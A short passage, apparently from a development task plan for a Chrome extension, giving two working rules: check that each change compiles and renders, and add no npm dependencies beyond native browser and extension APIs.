5. **After every task**, verify the change compiles (no syntax errors) and that the relevant UI still renders before moving on.
6. **Do not add new npm dependencies** — the extension must be dependency-free. All APIs used (IndexedDB, crypto.randomUUID, chrome.storage, fetch) are native browser or Chrome extension APIs.
